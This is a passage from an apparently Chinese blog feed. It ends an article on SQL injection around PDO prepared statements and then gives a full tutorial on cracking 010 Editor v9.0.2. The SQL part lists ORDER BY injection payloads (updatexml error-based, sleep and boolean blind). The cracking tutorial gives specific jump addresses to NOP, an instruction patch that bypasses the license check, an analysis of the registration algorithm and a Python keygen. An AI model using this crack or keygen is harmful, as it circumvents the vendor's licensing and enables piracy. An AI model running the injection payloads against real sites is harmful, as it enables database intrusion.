关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入：<code>username=t</code>，查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">21 Connectroot@localhost on sort using TCP/IP<br>21 Prepareselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Executeselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Close stmt<br>21 Quit<br></code></pre></td></tr></table></figure><p>发现这里没有把我们传的<code>username=t</code>绑定到查询语句中去，这是因为在绑定参数时包含％,而不是在SQL本身(预先准备好的语句)中,这是不起作用。所以这种情况下，开发可能会选择直接使用拼接语句，这就给了SQL注入的可能。</p><p>但是，也不是没有办法在使用like的情况下进行预编译，需要调用一些，MySQL的内置函数，例如将上述的查询语句更改为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction where name like concat(&#x27;%&#x27;,:username,&#x27;%&#x27;)<br># 这种情况下就能够进行在使用预编译的情况下进行like模糊查询<br></code></pre></td></tr></table></figure><h5 id="order-by后传入字段名"><a href="#order-by后传入字段名" class="headerlink" title="order by后传入字段名"></a>order by后传入字段名</h5><p>order by 简单用法</p><p><strong>作用</strong>：用于对结果集进行排序。</p><p><strong>语法：</strong>顺序：SELECT * from 表名 ORDER BY 排序的字段名 倒序：SELECT * from 表名 ORDER BY 排序的字段名 DESC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[ORDER BY &#123;col_name | expr | position&#125;  <br>[ASC | DESC], ...]  <br></code></pre></td></tr></table></figure><p><strong>注</strong>：ORDER BY 语句用于根据指定的列对结果集进行排序。ORDER BY 语句默认按照升序对记录进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by fraction DESC;# 根据字段fraction进行降序排列<br>select * from fraction order by fraction ASC;# 根据字段fraction进行升序排列<br></code></pre></td></tr></table></figure><p><code>order by</code>位置的注入点，其实跟平常的注入点类似，目前感觉区别不大，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by 1 and 1=updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- 报错注入<br>select * from fraction order by updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- 报错注入<br>select * from fraction order by if(1,sleep(3),sleep(0))# asc;-- 延时盲注，但这个延时了33秒，离谱<br>select * from fraction order by if((user()=&#x27;root@localhost&#x27;),fraction,id);# asc;-- 布尔盲注<br></code></pre></td></tr></table></figure><p>ok，回归正题，有时ORDER BY后的表名动态传入的SQL语句；渗透测试中允许用户传入按某个字段进行排序的行为，这很有可能是直接拼接的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$col</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;col&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 设置本地预编译，绑定参数</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by :col&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:col&quot;</span>,<span class="hljs-variable">$col</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入<code>col=fraction</code>，查看数据库执行日志，能够发现已经成功绑定参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">12 Connectroot@localhost on sort using TCP/IP<br>12 Prepareselect * from fraction order by ?<br>12 Executeselect * from fraction order by &#x27;fraction&#x27;<br>12 Close stmt<br>12 Quit<br></code></pre></td></tr></table></figure><p>但把执行的语句代入数据库命令行中再看，发现这结果不是我们想要的啊</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/12.png"></p><p>这是因为在进行参数绑定的时候，$col的值是一个字符串，在将$col的值绑定进sql语句中后，:col仍然是一个字符串，最终代入数据库进行执行的语句是<code>select * from fraction order by &#39;fraction&#39;</code>，而order by之后需要的是一个表名，这个表名不能以字符串的形式存在。因此，该位置大概率会被写成拼接，这就造成了SQL注入的可能。</p><h5 id="order-by后传入ASC-DESC"><a href="#order-by后传入ASC-DESC" class="headerlink" title="order by后传入ASC/DESC"></a>order by后传入ASC/DESC</h5><p>有时，可能会存在根据用户的选择来进行正序或倒叙排列，而这时如果<code>ASC/DESC</code>是从前端动态传入的，那此处大概率使用的是拼接</p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by fraction :asc&quot;</span>);<br></code></pre></td></tr></table></figure><p>当使用PDO，将预处理语句写成这样时，会抛出错误</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/13.png"></p><p>在MySQL命令行中，进行该预处理语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select * from fraction order by fraction ?&quot;;<br></code></pre></td></tr></table></figure><p>同样会抛出错误</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;?&#39; at line 1</code></p><p>所以当需要前端传入<code>ASC/DESC</code>时，后端大概率使用的是拼接，用了拼接就造成了SQL注入的可能</p><h4 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h4><p>目前所了解到的基本上就这些，看网上说还有”IN 语句之后”，但是经过测试之后发现<code>IN</code>语句之后能够正常使用预处理，<code>IN</code>语句之后若存在SQL注入的话大概率就是拼接，而拼接的话就跟普通的注入区别不大了，所以就没有写关于<code>IN</code>语句之后的。文章里面估计有一些错误的地方，以及一些没有说清的地方，后面翻看的时候如果发现了就再更新，毕竟现在菜的离谱，写错了也不知道错了；还有就是肯定有一些不能使用预编译或预编译可能存在的问题没有写到，后面如果学习到或者遇到的时候要补充进来的。最后的最后，该去想办法捡点垃圾吃晚饭了</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/14.png"></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.cnblogs.com/Cyangsec/p/13067369.html">https://www.cnblogs.com/Cyangsec/p/13067369.html</a></p><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f</a></p><p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p><p><a href="https://cloud.tencent.com/developer/news/378220">https://cloud.tencent.com/developer/news/378220</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-11">https://xz.aliyun.com/t/7132#toc-11</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>为了多捡点垃圾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010 Editor 破解</title>
    <link href="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="010-Editor破解"><a href="#010-Editor破解" class="headerlink" title="010 Editor破解"></a>010 Editor破解</h3><p>这篇文章来自于迫于无奈的技术分享，没啥会的，又不能与前面重复，于是乎是能看看网上的教程自己来一遍了。</p><p>可以说是抄的，但也有自己的分析与学习，故记录下来。</p><h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><h5 id="010Eitor-v9-0-2-64-bit"><a href="#010Eitor-v9-0-2-64-bit" class="headerlink" title="010Eitor v9.0.2 64-bit"></a>010Eitor v9.0.2 64-bit</h5><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li>exeinfope (查壳)</li><li>Xdbg (动态调试)</li><li>IDA (静态分析)</li><li>PyCharm (编写注册机)</li></ul><h4 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2. 暴力破解"></a>2. 暴力破解</h4><p>一般的破解，就是通过更改一些关键跳转，将本来指向错误的位置进行更改，使其指向正确的位置，从而跳过验证，使软件在进行验证时会直接走向成功；或者说，软件的注册码是根据用户名进行一个计算，最终得到一个注册码，这种可以通过输入用户名，然后在最后进行对比时获取得到该用户名的注册码，这样同样能够实现破解的效果。</p><h5 id="1）破解思路"><a href="#1）破解思路" class="headerlink" title="1）破解思路"></a>1）破解思路</h5><ul><li>查壳，有壳脱壳，无壳跳过</li><li>确定注册算法位置</li><li>找寻关键跳转，并将其更改指向成功位置</li><li>打包更改后的文件</li></ul><h5 id="2）破解过程"><a href="#2）破解过程" class="headerlink" title="2）破解过程"></a>2）破解过程</h5><p>从<a href="https://www.sweetscape.com/download/previous/">010Ediror官网</a>下载v9.0.2版本，然后安装，这里本来是想找v9.0.1版本的(因为教程上面是v9.0.1)，但苦于官网没有找到，所以只能下v9.0.2的了，但这两个实际上没啥区别。安装好之后，将安装好之后的可执行文件(可不是安装包)拖入exeinfope进行查壳</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/1.png"></p><p>可以看到程序无壳。可以直接附加到xdbg中进行分析</p><p>由于010Editor在Check License，当注册码不对时，会提示错误信息，所以这里可以采用字符串进行定位</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/2.png"></p><p>使用xdbg Alt+A将程序附加进来</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/3.png"></p><p>右键-搜索-所有模块-字符串，然后搜索刚刚报错页面上的字符串</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/4.png"></p><p>双击进入该函数，上下翻翻能够发现该函数不止有刚刚的错误信息，还有”Thank you for purchasing 010 Editor!”</p><p>所以基本上可以确定该函数就是Check License处的关键函数，在该函数头处下断点，然后点击Check License，能够发现EIP已经跳转至该位置：</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/5.png"></p><p>F8单步走一遍该函数，能够发现，在错误的注册码情况下，能够发现程序有两个关键性的跳转</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/6.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/7.png"></p><p>在程序正常执行下，在走到0x13FAF7AC2位置处，会直接跳转到0x13FAF7BB5处，此时ebx的值又不为0xDB，所以会继续进行跳转，并直接跳转到注册码错误位置，所以基本可以判定这两个跳转就是关键性的。此处发信啊” Thank you for purchasing 010 Editor!”这个字符串在第二个跳转后面，所以可以将0x13FAF7BBB处的jne使用nop进行注释掉</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/8.png"></p><p>F8继续单步执行，能够发现010Editor已经走到成功的位置</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/9.png"></p><p>此时基本ok，让程序跑起来，发现显示注册成功。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/10.png"></p><p>将修改之后的程序进行进行保存，ctrl+P，修改补丁，全选之后点击保存</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/11.png"></p><p>将保存的可执行文件放到010Editor的安装目录下(因为程序在执行的时候会调用一些其他文件)，然后即可实现破解</p><p>这样子破解的话，是存在一个问题的，就是在每一次打开010Editor的时候，都会让先进行注册码的校验，然后才能进入软件，其实没什么影响，但是看起来总归是有点不完美，所以需要找进行新一轮的尝试，捋一下刚刚的思路：</p><blockquote><p>有两个关键的跳转，一个是  cmp esi,E7  判断ESI是否为0xE7，不是则跳；另一个是 cmp ebx,DB，判断EBX是否为0xDB，不是则跳转，刚刚将cmp ebx,DB后面的跳转nop掉，使得破解成功。因此可以尝试控制EBX的值，让EBX=0xDB，这样程序可能就走不到弹出效验注册码的页面了，因为在打开程序时，程序内部校验发现已经注册成功，所以就不会跳到效验注册码的页面中了（猜测）。</p></blockquote><p>OK，回到程序，寻找控制EBX的位置，由于程序是经过两个跳转之后直接跳到验证码错误的位置，所以应该在第一个跳转前寻找控制ebx值的位置。这里有一点需要注意的是，EAX常用作函数返回值的存储，简单点说就是 return 1时，函数执行结束后，eax=1</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/12.png"></p><p>这里调用了两个函数，一个确定ESI，另一个确定EBX，将程序走到0x13FE97AC2，然后F7步入，发现调用的010Editor.1402B4820函数，跟进，将该函数走一遍</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/13.png"></p><p>发现该函数在0x1402B4861位置处将eax的值与0xE7进行比较，在错误的验证码情况下，此处会直接跳走</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/14.png"></p><p>跳到0x1402B48DC处，此处对eax进行一个赋值，赋值结束后直接函数结束了。然后回到刚刚的那个函数中，开始进行对比跳转。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/15.png"></p><p>由于我们需要EBX的值为0xDB，而<code>EBX=EAX</code>，EAX的值又是010Editor.1402B4820函数返回的，所以，我们可以在0x1402B48DC处将原本的<code>mov eax,177</code>更改为<code>mov eax,DB</code>，这样就可以满足<code>EBX=0xDB</code>。OK，选中该行-空格，然后将0x177更改为0xDB，然后确定</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/16.png"></p><p>更改完之后让程序跑起来，显示成功</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/17.png"></p><p>再将修改之后程序进行打包，保存到010Editor的安装目录中，尝试打开，能够发现已经不再需要Check License了</p><h4 id="3-算法分析"><a href="#3-算法分析" class="headerlink" title="3.算法分析"></a>3.算法分析</h4><p>通过前面的破解过程，基本可以判定确定ESI和EBX值的那两个函数就是我们想要找的注册算法函数，所以后面将着重分析这两个函数的内容。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/18.png"></p><p>首先对010editor.13F0C3F99进行分析，此处调用的是010Editor.140AB3F20函数，初步分析后，得出该函数，先对输入做了空检查，然后读取name和password，将password变为16进制并存储在内存中。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/19.png"></p><p>存储为16进制之后，原本输入的20位注册码现在就相当于是10组数据，将其看成一个数组k[10]。继续往下，程序读取了几组数据准备进行运算。然后对k[3]位置的值进行了一个三次比较。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/20.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/21.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/22.png"></p><p>所以可以猜测k[3]位置处存放的是一个注册码的版本，分别对应0x9C、0xFC、0xAC这三个版本，此处选用0x9C这个版本进行分析，有一个有意思的事情是，当把k[3]位置处更改为9C时，注册码就变成了8组（让程序处于脱离状态，要不然可能会有断点影响）</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/23.png"></p><p>这里将注册码输入为0123-459C-6789-ABCD，为方便后面的在内存中寻找，将程序运行，走到010Editor.140AB3F20函数里面。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/24.png"></p><p>注意图中箭头所指函数，当从执行完该函数后，注意看栈空间，注册码已经被保存到栈中，可以转到内存窗口中用于后续查看输入的注册码是否有变化。继续往下走，对于一些与注册码没有关系的操作可以适当进行忽略，因为认真分析那些可能没有什么用，需要寻找关键点进行分析。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/25.png"></p><p>有个跳转，但是跟进看了之后发现跟注册码貌似没什么关系，并且程序不会跳走，会继续执行，所以忽略。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/26.png"></p><p>这里先是将k[6]、k[5]、k[2]、k[1]、k[3]的值取出并存入寄存器中，k[3]用户确定注册码的版本，其余的解用于下面的计算，在确定了注册码版本之后，将k[0]取出存入ecx中，后面就是一系列的操作了，走到第一个call位置，这里直接使用IDA进行分析，看的更清楚一些。</p><p>使用IDA找到这个函数，这里有一点需要注意的是，xdbg是动态调试，IDA是静态分析，所以导致程序在他们两个中的基址可能是不相同的，所以需要更该IDA的基址，先在xdbg中alt+E查看程序基址</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/27.png"></p><p>再到IDA中 Edit-Segment-Rebase program，将在xdbg中得到的基址填入确定就可以了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/28.png"></p><p>OK，回到正题，双击第一个call位置，能够看到函数真正的位置为010editor.140AB3200，在IDA函数窗口中搜索140AB3200，然后F5反编译，能够发现该函数很简单，只是进行了异或、加的运算。这里需要注意的是CX通常用来传参，所以a1=CX，根据上面的分析，已知cl = k[0]^k[6]，所以a1=cx=cl=k[0]^k[6]。这个函数简单点说就是对k[0]、k[6]的一个操作</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/29.png"></p><p>回到xdbg，看一下第一个call和第二个call之间的内容，就是将函数的值存储到内存中，在转到地址窗口，后面会用到这个值。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/30.png"></p><p>继续向下分析，看第二个call，双击查看函数地址为010editor.140AB3170，然后用IDA找到，F5反编译，已知cx作为函数传参，而<code>ecx=ebx=(0x100*(k[1]^k[7])+(k[2]^k[5])</code>，也就是相当于把k[1]、k[2]、k[5]、k[7]计算的结果带入这个函数。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/31.png"></p><p>该函数就是对k[1]、k[2]、k[5]、k[7]的值进行一个计算，然后计算余数，当余数为0时返回商，余数不为0时返回0</p><p>看网上的文章说到这里可以建一个注册机模型，但还需要继续往下分析，因为有两处关键点需要进行分析</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/32.png"></p><p>第一个关键点是这里有一个跳转，跳转前面是<code>test ebx,ebx</code>判断ebx的值是否为0，为0则跳转。而ebx的值是第一个call计算出来的，所以此处还以判断第一个call需要返回一个大于0的值。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/33.png"></p><p>第二处关键位置是上图中的<code>cmp eax 0x3E7</code>，此处需要满足eax大于0x3E7才能保证不跳转，而eax又是第二个call返回的。到这里后可以构建一个简单注册机模型用于满足je和ja这两处关键的跳转，该模型只是通过穷举的思路来满足跳转(参考大佬的，要是我肯定是从0x00跑到0xff)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># 使用随机数来产出符合要求的注册码</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    k = [<span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xcd</span>] <span class="hljs-comment"># 定义一个长度为8的数组，k[3]=0x9c</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k0 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k6 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        al = (k0 ^ k6 ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">0x3D</span>) ^ <span class="hljs-number">0xA7</span><br>        <span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># 根据je跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k1 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k7 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k2 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k5 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br><br>        esi = (<span class="hljs-number">0x100</span> * (k1 ^ k7 &amp; <span class="hljs-number">0xFF</span>) + k2 ^ k5 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        eax = (((esi ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span>(eax % <span class="hljs-number">0xb</span> ==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> eax/<span class="hljs-number">0xb</span> &lt;=<span class="hljs-number">0x3e8</span>):      <span class="hljs-comment"># 根据ja跳转</span><br>            k[<span class="hljs-number">1</span>] = k1<br>            k[<span class="hljs-number">7</span>] = k7<br>            k[<span class="hljs-number">2</span>] = k2<br>            k[<span class="hljs-number">5</span>] = k5<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%x%x-%x%x-%x%x-%x%x&quot;</span>%(k[<span class="hljs-number">0</span>],k[<span class="hljs-number">1</span>],k[<span class="hljs-number">2</span>],k[<span class="hljs-number">3</span>],k[<span class="hljs-number">4</span>],k[<span class="hljs-number">5</span>],k[<span class="hljs-number">6</span>],k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span>(__name__ == <span class="hljs-string">&quot;__main__&quot;</span>):<br>    main()<br></code></pre></td></tr></table></figure><p>继续往下分析，将程序运行到<code>cmp eax 0x3E7</code>位置，修改eax的值，保证下面的ja不跳转，然后一直往下走，走到如下图位置，读取用户名，因为在上面对注册码计算时，没有对用户名进行任何操作，所以接下来应该是对用户名进行一个操作了。同时要注意接下来的call，下面的可能是对用户名进行一个操作。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/34.png"></p><p>跟进，步入函数，同时使用IDA查看该函数，发现该函数共接收4个参数，这里可以回看一下上面的在进入<code>call 010editor.13FF97FD6</code>之前，先后向rcx,rd9,rd8,edx中传入参数。</p><p>已知在64位汇编中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，所以这里向这四个寄存器传入的值，就是传进的参数，但是这里IDA反编译出来的结果，顺序好像有点对不上</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/35.png"></p><p>不过问题不大，可以对照xdbg，判断出a1,a2,a3,a4的值</p><p>这里先看一下传入各个寄存器的值</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/36.png"></p><p>进过对比分析后得出</p><blockquote><p>a1=用户名</p><p>a2=1</p><p>a3=0</p><p>a4=商，也就是前面一个函数的返回值</p></blockquote><p>继续往下分析，该函数先是计算了一下用户名的长度，若用户名长度不为0则对一些变量进行赋值操作</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/37.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/38.png"></p><p>这里，就是根据用户名、再配合上dword_1420750E0这个数据进行一个计算，将值保存到v4中，然后返回，这里看一下dword_1420750E0这个数组，没啥看的，一堆数字</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/39.png"></p><p>这里需要做的是导出这段数据，因为接下来计算注册码时一定能够使用到。这里看网上的是用OD插件导出，导出的数据很完美，奈何我的OD用不了，挂载不了010Editor的程序，所以只能被迫使用IDA,导出数据，导出的数据是10进制的，然后还有点不完美，不过不影响，稍微更改一下就可以用了，选中该数据，shift+e，导出数据即可</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/40.png"></p><p>继续往下走，该函数根据用户名和商计算出一个值，然后与输入的注册码的k[4]、k[5]、k[6]、k[7]比较，后面将k[0]和看k[6]的计算结果与0xA进行了一个比较<code>cmp eax,dword ptr ds:[rdi+2C]</code></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/41.png"></p><p>所以就需要修改刚刚的注册机模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># 根据je跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <br><span class="hljs-comment"># 更改为</span><br><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0xA</span>):           <span class="hljs-comment"># 根据jbe跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br></code></pre></td></tr></table></figure><p>到这里基本上可以对注册机编写，先捋一下思路，要是思路还不清晰，可以再多走几遍程序</p><blockquote><p>程序先对k[0]和k[6]进行一个计算处理</p><p>再对k[1]、k[2]、k[5]、k[7]计算得出一个商</p><p>然后根据商、用户名、和内存中的一个数组计算出k[4]、k[5]、k[6]、k[7]的值</p><p>计算出的值，再与输入的注册码进行比较，比较成功则成功</p></blockquote><p>注册机编写思路：</p><blockquote><p>先随机取一个满足条件的商</p><p>根据商与用户名计算出注册码的后四位</p><p>再根据商反推出k[1]和k[2]</p><p>最后再根据k[6]取一个符合条件的k[0]</p></blockquote><figure class="highlight python"><table><tr><td 